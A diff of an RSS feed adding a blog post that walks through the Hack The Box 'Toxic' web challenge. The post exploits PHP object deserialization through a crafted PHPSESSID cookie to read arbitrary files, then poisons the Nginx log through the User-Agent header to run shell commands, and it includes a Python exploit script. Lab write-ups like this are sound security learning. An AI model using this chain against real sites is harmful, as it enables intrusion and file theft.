@@ -1,4 +1,75 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Logan MacLaren</title><link>https://maclarel.github.io/posts/</link><description>Recent content in Posts on Logan MacLaren</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Tue, 13 Sep 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://maclarel.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Hack The Box - PetPetRcbee</title><link>https://maclarel.github.io/posts/2022-09/htb_petpetrcbee/</link><pubDate>Tue, 13 Sep 2022 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2022-09/htb_petpetrcbee/</guid><description>Premise PetPetRcbee is a Web challenge from Hack The Box that presents itself as a website which will take an image and animate it. Unlike many other challenges, you may be able to solve this one without ever actually looking at the site or seeing how it works&amp;hellip;
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Logan MacLaren</title><link>https://maclarel.github.io/posts/</link><description>Recent content in Posts on Logan MacLaren</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Thu, 15 Sep 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://maclarel.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Hack The Box - Toxic</title><link>https://maclarel.github.io/posts/2022-09/htb_toxic/</link><pubDate>Thu, 15 Sep 2022 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2022-09/htb_toxic/</guid><description>Premise Toxic is another whitebox Web challenge from HackTheBox, and presents itself as a web page about the Dart Frog. The goal here is to find a way to retrieve the flag from the web server, using what appears to be a non-interactive webpage.
+Captain Crunch hurts my mouth Since this is a whitebox challenge, we&amp;rsquo;re given the source code to review, and a local container that we can play with if so inclined.</description><content type="html"><![CDATA[<h1 id="premise">Premise</h1>
+<p><code>Toxic</code> is another whitebox <code>Web</code> challenge from HackTheBox, and presents itself as a web page about the Dart Frog. The goal here is to find a way to retrieve the flag from the web server, using what appears to be a non-interactive webpage.</p>
+<h1 id="captain-crunch-hurts-my-mouth">Captain Crunch hurts my mouth</h1>
+<p>Since this is a whitebox challenge, we&rsquo;re given the source code to review, and a local container that we can play with if so inclined.</p>
+<p>The HTML of the website seems pretty basic, but there&rsquo;s some interesting stuff in the PHP:</p>
+<pre><code>if (empty($_COOKIE['PHPSESSID']))
+{
+    $page = new PageModel;
+    $page-&gt;file = '/www/index.html';
+
+    setcookie(
+        'PHPSESSID', 
+        base64_encode(serialize($page)), 
+        time()+60*60*24, 
+        '/'
+    );
+} 
+
+$cookie = base64_decode($_COOKIE['PHPSESSID']);
+unserialize($cookie);
+</code></pre><p>PageModel.php is braindead and just serves up whatever the <code>PHPSESSID</code> cookie contains:</p>
+<pre><code>&lt;?php
+class PageModel
+{
+    public $file;
+
+    public function __destruct() 
+    {
+        include($this-&gt;file);
+    }
+}
+</code></pre><p>Looks like we&rsquo;ll need to provide our own <code>PHPSESSID</code> cookie with a serialized page request out to the flag. We can see that the one we get is a <code>base64</code> encoded string of <code>O:9:&quot;PageModel&quot;:1:{s:4:&quot;file&quot;;s:15:&quot;/www/index.html&quot;;}</code>, so let&rsquo;s try to modify that and re-encode it.</p>
+<p>Let&rsquo;s start by base64 encoding the above string, but with the last bit changed to <code>/flag</code> - <code>Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL2ZsYWciO30g</code>.</p>
+<p>This threw an error to start:</p>
+<pre><code>2022/07/31 18:10:27 [error] 17#17: *13 FastCGI sent in stderr: &quot;PHP message: PHP Notice:  unserialize(): Error at offset 32 of 45 bytes in /www/index.php on line 24PHP message: PHP Notice:  Undefined property: PageModel::$file in /www/models/PageModel.php on line 8PHP message: PHP Warning:  include(): Filename cannot be empty in /www/models/PageModel.php on line 8PHP message: PHP Warning:  include(): Failed opening '' for inclusion (include_path='.:/usr/share/php7') in /www/models/PageModel.php on line 8&quot; while reading response header from upstream, client: 172.17.0.1, server: _, request: &quot;GET / HTTP/1.1&quot;, upstream: &quot;fastcgi://unix:/run/php-fpm.sock:&quot;, host: &quot;localhost:1337&quot;
+</code></pre><p>Let&rsquo;s keep playing. This says that $file is empty/undefined. I think this is because we didn&rsquo;t encode the string properly. Need to update the second <code>s</code> to note the proper length of the string, e.g.:</p>
+<pre><code>O:9:&quot;PageModel&quot;:1:{s:4:&quot;file&quot;;s:5:&quot;/flag&quot;;}
+</code></pre><p>This gives us <code>Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czo1OiIvZmxhZyI7fQ==</code></p>
+<p>This properly gives us the value, but still an error:</p>
+<pre><code>2022/07/31 18:12:56 [error] 17#17: *15 FastCGI sent in stderr: &quot;PHP message: PHP Warning:  include(/flag): failed to open stream: No such file or directory in /www/models/PageModel.php on line 8PHP message: PHP Warning:  include(): Failed opening '/flag' for inclusion (include_path='.:/usr/share/php7') in /www/models/PageModel.php on line 8&quot; while reading response header from upstream, client: 172.17.0.1, server: _, request: &quot;GET / HTTP/1.1&quot;, upstream: &quot;fastcgi://unix:/run/php-fpm.sock:&quot;, host: &quot;localhost:1337&quot;
+</code></pre><p>The paths are absolute, as we can see with the original. Hmm&hellip; I must be missing something simple.</p>
+<h1 id="narrator-he-was-missing-something-simple">Narrator: &ldquo;He was missing something simple&rdquo;</h1>
+<p>Aha! I had missed that the flag name gets randomized by <code>entrypoint.sh</code>:</p>
+<pre><code>mv /flag /flag_`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1`
+</code></pre><p>It&rsquo;s only 5 chars and alphanum so we could bruteforce this, but there must be an easier way. Copying the file manually to <code>/flag</code> we can confirm that the approach of just putting the filename in there is sound - likewise trying to retrieve <code>/etc/passwd</code>. At this point we have two ways to try to solve this challenge:</p>
+<ol>
+<li>Brute force the flag filename&hellip; 5^62 complexity though. Maybe not&hellip;</li>
+<li>Find another way to figure out what the flag&rsquo;s full filename is.</li>
+</ol>
+<h1 id="ah-thats-why-its-called-toxic">Ah, that&rsquo;s why it&rsquo;s called Toxic&hellip;</h1>
+<p>Ok, the smarter path here is a technique called <code>log poisoning</code>. Since we know we can retrieve any file, we can probably get our webserver logs, too.</p>
+<p>We can see, since we have a local copy of this challenge running, that Nginx will log a few things we send to it in its <code>access.log</code>. One of these things is the <code>USER_AGENT</code> header. As luck would have it, we can set the <code>USER_AGENT</code> string to something that would be interpreted as a PHP file and basically have full RCE here (including shell access, if we wanted):</p>
+<pre><code>import requests
+import base64
+
+cookie_payload = 'O:9:&quot;PageModel&quot;:1:{s:4:&quot;file&quot;;s:25:&quot;/var/log/nginx/access.log&quot;;}'
+cookie_payload_bytes = cookie_payload.encode('ascii')
+cookie_payload_base64_bytes = base64.b64encode(cookie_payload_bytes)
+cookie_payload_message = cookie_payload_base64_bytes.decode('ascii')
+cookies = {'PHPSESSID': cookie_payload_message}
+header_payload = &quot;&lt;?php system('ls -l /');?&gt;&quot;
+headers = {'User-Agent': header_payload}
+
+url = &quot;http://localhost:1337&quot;
+
+response = requests.get(url, cookies=cookies, headers=headers)
+print(response.text)
+</code></pre><p>This will dump the Nginx <code>access.log</code> (since we know the path) and thanks to the log poisoning via <code>USER_AGENT</code> header we&rsquo;ll be able to get the filename of our target flag. Note that you may need to run this twice since the first hit won&rsquo;t have dumped the output in to the log yet.</p>
+<p>Use this filename to update either the <code>USER_AGENT</code> header payload to <code>cat</code> out the flag, or use the <code>PHPSESSID</code> cookie that we were originally playing with to just retrieve it directly, and you&rsquo;re done!</p>
+<p>GG!</p>
+]]></content></item><item><title>Hack The Box - PetPetRcbee</title><link>https://maclarel.github.io/posts/2022-09/htb_petpetrcbee/</link><pubDate>Tue, 13 Sep 2022 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2022-09/htb_petpetrcbee/</guid><description>Premise PetPetRcbee is a Web challenge from Hack The Box that presents itself as a website which will take an image and animate it. Unlike many other challenges, you may be able to solve this one without ever actually looking at the site or seeing how it works&amp;hellip;
 The setup This is a Flask application using Pillow and Ghostscript (9.23 - remember this) as the basis for its functionality. The overall source code is quite minimal, so review is easy.</description><content type="html"><![CDATA[<h1 id="premise">Premise</h1>
 <p>PetPetRcbee is a <code>Web</code> challenge from Hack The Box that presents itself as a website which will take an image and animate it. Unlike many other challenges, you may be able to solve this one without ever actually looking at the site or seeing how it works&hellip;</p>
 <h1 id="the-setup">The setup</h1>
